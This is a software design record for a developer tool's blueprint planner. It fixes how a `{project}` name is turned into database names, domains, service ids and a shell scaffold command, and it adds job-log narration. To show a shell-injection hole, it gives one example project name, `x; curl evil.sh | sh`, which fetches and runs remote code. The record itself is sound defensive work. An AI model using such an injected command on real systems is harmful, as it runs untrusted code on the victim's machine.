# T120 — `{project}` expands to a slug, and a plan says so before an apply finds out

**Date:** 2026-09-12
**Status:** accepted
**Roadmap:** phase 14, task **T120** — a defect in **T77** (the planner) and **T78/T78a** (the
executor), found by **T117**'s Quick Start, which is the first place a person who has never read a
naming rule types a project name.

## The failure this answers

Applying the `laravel` blueprint to a project called `laravel 1` fails with:

> `laravel 1` cannot be a database or account name: only lower-case letters, digits and hyphens are
> allowed — left in place: the directory `…\www\laravel1`, node 24.19.0, now installed, composer
> 2.10.3, now installed, mariadb 12.3.2, now installed, the database `laravel 1` on `mariadb@main`

Three separate defects meet in that one line.

### 1. One token, four name spaces, one charset — and it is the wrong one

`crates/mixengine-core/src/blueprints/plan.rs` expands `{project}` with
`value.replace(TOKEN, project)`, where `project` is the **project's name**. That name is held only
to `projects::validated_name`: non-empty, at most 64 characters, no control character, no path
separator. Everything else — spaces, capitals, underscores, `;`, `$`, quotes — is a legal project
name.

That string is then substituted into four name spaces whose rules are all stricter:

| Where it lands | Who decides the charset | What it allows |
|---|---|---|
| `[[services]] database` / `user` | `generate::databases::validated_identifier` | `[a-z0-9-]`, ≤ 32, no leading/trailing `-` |
| `[site] domain_pattern`, `aliases` | `domains::normalised` → `domain_syntax` | DNS label rules, managed TLD |
| `[[services]] instance = "per-project"` | `ServiceId::parse` | `[a-z0-9-]`, must start alphanumeric |
| `[scaffold] command` | a shell (`spawn_shell_supervised`) | everything, which is the problem |

`laravel 1` is legal as a project name and illegal in all four.

### 2. The planner's D10 promise is broken

`plan.rs`'s module note says everything that cannot be done is decided at plan time, so that an
apply does not get five actions into a project directory before discovering the sixth was
impossible. It does not hold:

- `database_step` checks **only** `user.len() > DATABASE_USER_LIMIT`. It never asks
  `validated_identifier` whether the name is spellable at all.
- `domain_step` checks **only** whether another site already holds the name. It never asks
  `domains::normalised` whether the name is a domain.

So the dry run is green, the user presses Apply, and the failure lands after the directory has been
created and three packages downloaded. `Kept::Database` is even written to the ledger *before* the
call that fails, which is why the error names a database that was never made.

### 3. A security comment that asserts something untrue

`plan.rs:279` justifies interpolating the project name into a shell command:

> the substitution is safe in front of a shell because a project name has already been through the
> slug charset, which holds no shell metacharacter

A project name has been through no such thing. A project named `x; curl evil.sh | sh` produces a
`[scaffold]` command that runs both halves. The consent dialog does display the expanded command
before it runs, so a person is shown what they typed — but the invariant the comment rests on does
not exist, and the code is correct only by that accident.

### 4. `Show output` shows nothing

`LogSubject::Job`'s ring is written by exactly one place in the whole daemon — the `RunScaffold`
step (`apply.rs:509`). Every other step of an apply narrates only to the job's *progress* field. So:

- an apply that fails before the scaffold has an **empty** job log, which is what the button shows;
- `ApplyDialog` opens the stream only when `showLog` is first turned on, so anything printed before
  the click is already gone;
- the button is rendered only while `phase.kind === "running"`, so an apply that **fails** takes the
  only route to its own output away at the moment it becomes worth reading.

### Blast radius

Every blueprint in the gallery — `django`, `laravel`, `nextjs`, `static`, `symfony`, `wordpress` —
uses `{project}` in `domain_pattern`, and four of them use it as a database name. The bug fires for
any project name that is not already a slug: a space, a capital letter, an underscore, an accent.

## What changes

### D1 — `{project}` expands to the project's **handle**, not its name

`domains::slug` already turns a project name into a DNS label, and `project.create` has used it
since T39a to derive a project's default domain. This makes the blueprint planner use the same rule
for the same reason: one project, one human name, one machine handle.

```
"laravel 1"   → laravel-1
"My Blog"     → my-blog
"my_blog"     → my-blog
"Dự án"       → d-n
"日本"         → (nothing — see D3)
```

`PlanAction::RegisterProject { name }` keeps the **unslugged** name: that is what the person typed,
it is what `project.list` shows, and nothing downstream of it has a charset. Everything else in the
plan — database, account, domain, alias, per-project instance, scaffold command — takes the handle.

**A handle is computed once**, at the top of `plan()`, and passed down. Nothing below re-derives it,
for the same reason `expand` exists at all: a second place to compute it is a second answer.

Concretely, `expand(value, project)` becomes a method on a small `Handle` value:

```rust
/// What `{project}` becomes, and the name it was made from.
struct Handle<'a> {
    /// What the person typed. Only `RegisterProject` gets this.
    name: &'a str,
    /// The same name as something a database, a domain and a service id can all hold.
    /// `None` when the name has no ASCII in it at all.
    slug: Option<String>,
}

impl Handle<'_> {
    /// `value` with `{project}` expanded, or the reason it cannot be.
    fn expand(&self, value: &str) -> Result<String, String>;
}
```

`expand` answers `Err` **only** when `value` actually contains the token and `slug` is `None`. A
manifest that never mentions `{project}` is unaffected by a name nothing can be slugged from.

### D2 — every expanded name is validated at plan time

This is D10 restored, and it is what makes the fix hold for names D1 does not rescue (a 40-character
project, a blueprint carrying `{project}.dev`).

- **`database_step`** runs `generate::databases::validated_identifier` over both the database and
  the account, and blocks with that function's own sentence. The hand-copied `DATABASE_USER_LIMIT`
  constant goes: it existed to restate a rule this now calls directly, and a copy of a rule is a
  place for the rule to drift.
- **`domain_step`** runs `domains::normalised(domain, false)` before it asks who holds the name, and
  blocks with that error. A blueprint from another machine naming an unmanaged TLD is now a blocked
  step rather than a mid-apply failure.
- **`ensure`** already blocks a pair that cannot be a `ServiceId` (`plan.rs:553`). It stays as it
  is; D1 makes it unreachable for a `per-project` instance, and it remains the guard for a manifest
  that hard-codes a bad instance name.
- **`register`** already runs `projects::validated_name`. It stays.

A step being blocked is enough: `canApply` refuses an apply while any step is blocked, so a blocked
domain does not need the certificate step blocked as well.

### D3 — a name with nothing to slug is blocked where it is used

`domains::slug("日本")` is `None`: there is no ASCII to make a label from. Rather than blocking the
project registration — a manifest that uses no `{project}` would then be refused for no reason —
each step that *needs* the token blocks itself, with the sentence `domains::default_for` already
uses:

> there is nothing in the project's name a domain label can be made of

### D4 — the security comment becomes true

After D1 the shell interpolation is safe, and for a reason that now exists: the value substituted is
a slug, produced by `domains::slug`, whose output alphabet is `[a-z0-9-]`. The comment at
`plan.rs:279` is rewritten to say that — that the **handle** is a slug, not that the project's name
is one. The distinction is the whole fix.

### D5 — an apply narrates into its job's log

`perform()` opens the job's ring **once, before the first step**:

```rust
let log = self.services().logs().feeding(&LogSubject::Job { id: handle.id() }, scaffold::RING_LINES);
```

and records a line as each step begins and as it ends — `Stream::Stdout` for progress, `Stream::Stderr`
for a failure — plus one final line carrying the error that ended the job. The `RunScaffold` step
keeps its own `feeding` call: it asks for the same subject and the same `keep`, so it is a no-op
that leaves that module readable on its own.

This is worth doing beyond the button: `mix job logs <id>` gets the same narration, and a failed
apply becomes readable from the CLI with no client changes at all.

**The ring is forgotten when the job ends.** `Logs::forget_if_unwatched` is called for
`LogSubject::Job` where the job finishes. Without it, every apply leaves a 200-line ring in the
daemon's map forever — a leak that exists today for scaffold jobs and that D5 would otherwise
extend to every apply. A client already following keeps its own `broadcast::Receiver`, which
outlives the map entry, so an open stream is unaffected.

### D6 — the client collects the log from the start, and can read it after the failure

Two changes in `ApplyDialog.tsx`:

1. The subscription no longer waits for `showLog`. It opens when the phase becomes `running` and
   closes when the dialog leaves that phase. The button toggles **visibility**, not collection —
   which is the actual reason clicking it showed nothing.
2. The output panel and its button render whenever there is something to show
   (`phase.kind === "running" || logEntries.length > 0`), so an apply that failed still has its
   output underneath the error.

`logEntries` is already capped at 2000 by `applyLogFrame`, so collecting from the start costs a
bounded amount of memory.

### D7 — no wire change

Nothing in `mixengine-proto` changes: no new variant, no new field, no changed shape. `bindings.sh`
does not need to run, and `apps/desktop` compiles against the bindings it already has.

## Self-critique

**Silent normalisation.** A person who types `My Blog` gets a database called `my-blog` without
being told. The plan is the answer: every step is rendered before anything happens, and
`creating the database my-blog on mariadb` is on screen next to the project's name. That is a plan
doing its job, and it is strictly better than today's "green plan, failed apply".

**Two projects, one handle.** `My Blog` and `my-blog` slug to the same thing. Neither the database
step nor the domain step invents a suffix to dodge the collision: `domain_step` already blocks on a
domain another site holds, and `database.create` is idempotent — a second project pointing at the
same database is a person reusing it, which is a legal thing to want. The project names themselves
stay distinct because `projects` has its own unique index on the untouched name. This is the same
position `domains::default_for` already takes ("a collision is not this function's business") and
diverging from it here would be two policies for one question.

**A long name.** `slug` does not truncate, so a 40-character project still produces a 40-character
database name — refused by `validated_identifier` at 32. D2 makes that a blocked step naming the
limit, which is what the deleted `DATABASE_USER_LIMIT` check was for; it is now enforced by the
function that owns the rule instead of by a copy of its number.

**A slug that is a Windows device name.** A project called `con` yields the instance `con` and the
id `mariadb@con` — not reserved, because `ServiceId::RESERVED` matches the whole id and the `@`
makes it not a device name. A `per-project` front end would be `caddy@con`, same reasoning. No new
case.

**Resumption.** `register` finds an existing project by `record.name == project`, using the
**unslugged** name — unchanged by D1, so a re-run of a failed apply still recognises its own first
step. `database.create` is idempotent and `domain_step` treats a name this apply already claimed as
its own. Re-running an apply that failed at the database step now succeeds rather than failing the
same way.

**Backward compatibility.** A project whose name is already a slug slugs to itself, so every apply
that works today produces a byte-identical plan. The only behaviour that changes is behaviour that
is currently a failure. There is no state to migrate: a database named from an unslugged project
name cannot exist, because creating one is exactly what fails.

**Performance.** One `slug()` call per plan over a ≤64-character string. Two log lines per step,
into a 200-line ring, for a job that is downloading runtimes — unmeasurable. `forget_if_unwatched`
turns an unbounded per-job leak into none.

**Security.** D1 removes the shell-metacharacter path into `[scaffold]` rather than escaping it,
which is this codebase's standing preference (`validated_identifier`, `validated_password`,
`validated_slug` all refuse rather than escape). The narration in D5 writes the project's name into
a log a terminal renders; `projects::validated_name` already refuses control characters, so no ANSI
escape can reach it. The daemon does not gain a capability: a blocked step is a refusal, and
refusals are free.

**What this deliberately does not do.** It does not tighten `projects::validated_name`. A project
name is a label a person reads, `project.create` has accepted spaces since phase 0, and narrowing it
would invalidate names already in people's databases to solve a problem that belongs to the four
name spaces the token lands in. It also does not change the ledger, which writes `Kept::Database`
before the call that makes it — deliberately, because `database.create` failing halfway is exactly
when a person needs to be told a database may be there. The reported failure that named a database
nothing had made is answered by never reaching that step: after D2 the plan is blocked and no apply
starts.

## Acceptance

1. Applying `laravel` to a project named `laravel 1` succeeds, creating the database and account
   `laravel-1` and the site `laravel-1.test`, with `project.list` still showing `laravel 1`.
2. `--dry-run` renders those names, so the plan a person reads names what will exist.
3. A project name with no ASCII produces a **blocked** plan naming the reason, and no apply can be
   started from it.
4. A project name that slugs to more than 32 characters produces a blocked database step naming the
   limit.
5. A blueprint whose `domain_pattern` names an unmanaged TLD produces a blocked domain step.
6. Every blueprint in the gallery plans without a blocked step for the project name `My Project 1`.
7. `GET /logs/job/<id>` carries a line per step for any apply, not only one that runs a scaffold.
8. In the desktop client, `Show output` reveals the narration of an apply — including one that has
   already failed.
9. `cargo clippy --workspace -- -D warnings`, `cargo fmt --all --check`, `cargo test --workspace`,
   rustdoc with `-D warnings`, and `npm run build && npm test && npm run lint` in `apps/desktop` are
   all clean.

## Files

| File | Change |
|---|---|
| `crates/mixengine-core/src/blueprints/plan.rs` | `Handle`, D1–D4; `database_step` and `domain_step` validate |
| `crates/mixengine-core/tests/blueprint_gallery.rs` | every gallery blueprint plans clean for an awkward name |
| `crates/mixengine-daemon/src/api/apply.rs` | D5: open the ring, narrate each step, forget it at the end |
| `apps/desktop/src/modules/mixengine/screens/Blueprints/ApplyDialog.tsx` | D6 |
| `.claude/decisions/0030-the-project-token-expands-to-a-slug.md` | new ADR |
| `.claude/roadmap/phase-14-a-window-a-new-user-can-start-from.md` | T120 |
